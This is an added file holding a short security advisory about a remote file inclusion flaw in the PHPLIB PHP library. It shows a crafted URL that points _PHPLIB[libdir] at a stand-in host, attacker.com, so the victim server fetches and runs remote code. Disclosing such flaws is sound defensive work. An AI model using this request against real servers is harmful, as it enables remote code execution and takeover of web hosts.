@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/3079/info
+
+The PHP Base Library('PHPLIB') is a code library which provides support for session management in web applications. It is targeted to developers and is widely used in many web applications, so a strong possibility exists that an application may be using it without the knowledge of the administrator. 
+
+A problem in PHPLIB will allow remote attackers to submit malicious input in web requests that will cause the application to fetch and then execute scripts from another host.
+
+This may allow for attackers to gain local access to the webserver.
+
+If $_PHPLIB[libdir] is a string whose value
+is "http://attacker.com/", this instruction will be executed:
+
+require("http://attacker.com/" . "db_mysql.inc");
+
+Thus, simply crafting a URL like:
+
+http://victim.com/any/phplib/page.php?_PHPLIB[libdir]=http://attacker.com/
+
+will make the script 'page.php'(which the attacker knows is based on the PHPLIB toolkit) include and execute any arbitrary php instruction contained in a file named 'db_mysql.inc'.
